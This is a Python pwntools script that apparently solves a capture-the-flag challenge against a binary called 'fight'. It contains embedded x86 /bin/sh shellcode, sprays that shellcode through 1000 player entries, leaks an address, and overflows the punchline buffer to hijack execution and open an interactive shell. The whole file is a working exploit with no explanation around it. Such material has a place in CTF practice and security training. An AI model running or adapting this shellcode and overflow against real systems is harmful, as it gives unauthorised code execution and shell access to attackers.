from pwn import *


def add_player(r, name, punch, strat):
    r.recvuntil("quit)")
    r.sendline("2")
    r.recvuntil("):")
    r.sendline(name)
    r.recvuntil("):")
    r.sendline(punch)
    r.recvuntil("):")
    r.sendline(str(strat))


if __name__ == "__main__":

    #r = remote("ncsc.ccis.no", 7070)
    r = process('./fight')

    name = "C" * 23
    punch = "B" * 510
    shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"


    log.info("Adding players")

    for c in range(1000):
        add_player(r, shellcode, shellcode, 2)

    log.info("Finished adding players")

    r.recvuntil("quit) ")
    r.sendline("2")
    data = r.recvuntil(")")
    address = data[-10:-1].strip()
    log.info("Found address at " + address)
    address = p32(int(address, 0) + 0x244) # add the offset that we want.

    r.sendline()
    r.recvuntil("punchline")
    r.sendline()
    r.recvuntil("strategy")
    r.sendline()

    # Overflowwww
    r.recvuntil("quit)")
    r.sendline("2")
    r.recvuntil("name")
    r.sendline("A")
    r.recvuntil("punchline")
    r.sendline(punch + "B")
    r.recvuntil("strategy")
    r.sendline("1")

    # This is where we control the address we are jumping to
    r.sendline("10 20 " + address)
    r.sendline()


    # FIGHT FIGHT FIGHT
    r.sendline("3")

    log.success("You've got shell!")

    r.interactive()
